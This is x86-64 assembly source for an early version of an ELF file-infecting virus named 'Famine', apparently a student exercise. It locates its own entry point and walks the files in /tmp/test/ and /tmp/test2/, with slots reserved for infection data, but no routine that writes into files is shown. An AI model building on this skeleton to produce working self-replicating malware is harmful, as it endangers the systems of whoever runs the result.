section.text:
	global _start:function

;-------------------------------------------------------------------------------
;|   r8   | virus entry                                                        |
;|   r9   | end of virus (without params)                                      |
;-------------------------------------------------------------------------------

;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx) in this specific order
; (make sense with syscall)

_start:
	call _inject; push addr to stack
%ifdef DEBUG; ==================================================================
	db `....FAMINE....`, 0x0

newline db `\n`, 0x0

_ft_strlen:; (string rdi) - use rcx, rsi
	xor rcx, rcx; = 0
	.count_char:
		cmp byte [rdi + rcx], 0
		jz .return
		inc rcx
		jmp .count_char
	.return:
ret

_print:; (string rdi) - use rcx, rdi, rsi, rdx, rax, r15(temp)
	call _ft_strlen
	push rdi; mov rsi, rdi
	pop rsi
	push rcx; mov rdx, rcx
	pop rdx
	push 1; mov rax, 1
	pop rax; write
	push 1; mov rdi, 1
	pop rdi
	syscall

	push rsi
	pop r15
	lea rsi, [rel newline]
	push 1
	pop rax; write
	push 1
	pop rdx
	syscall
	push r15
	pop rdi
ret

%endif; ========================================================================

_inject:
	pop rdi; pop addr from stack
	push rdx; save register
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	sub rdi, 0x5; sub call instr
	push rdi; mov r8, rsi
	pop r8
; r8 contains the entry of the virus

	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_dir:
		add rdi, rcx
		call _infect_dir
		xor rcx, rcx; = 0
		.next_dir:; seek next dir
			inc rcx
			cmp byte[rdi + rcx], 0x0
			jnz .next_dir
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_dir

	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz _infected
	jmp _host

_infect_dir:; (string rdi)
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	sub rsp, 1024; buffer of 1024 on stack
	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path
	push rax
	pop rdi; fd
	mov r11, rdi; save fd

	.getdents:
		push 78
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_dir:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		%ifdef DEBUG
			push rsi
			push rdx
			push rcx
			call _print; _print(rdi)
			pop rcx
			pop rdx
			pop rsi
		%endif

		mov rsi, r12
		add rsi, rcx
		push rdi
		movzx edi, word [rsi + 16]; linux_dir->d_reclen
		add rcx, rdi
		pop rdi
		jmp .loop_in_dir

	.close:
		push 3
		pop rax; close
		syscall

		push r10
		pop rdi

	.return:
		add rsp, 1024
		push rdi
		pop rsi
ret

_host:
	jmp _check_end
	_back_host:
		pop r9
; r9 contains the end of the virus (minus params)
	jmp _exit

_infected:
	jmp _exit

	push rdx
	push rdx
_exit:
	pop rdx
	pop r13
	pop r14
	pop r15

	mov rax, 60 ; exit
	mov rdi, 0
	syscall

directories db `/tmp/test/`, 0x0, `/tmp/test2/`, 0x0, 0x0
db `Famine version 1.0 (c)oded by lmartin`; sw4g signature

_check_end:
	call _back_host; push addr to stack

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
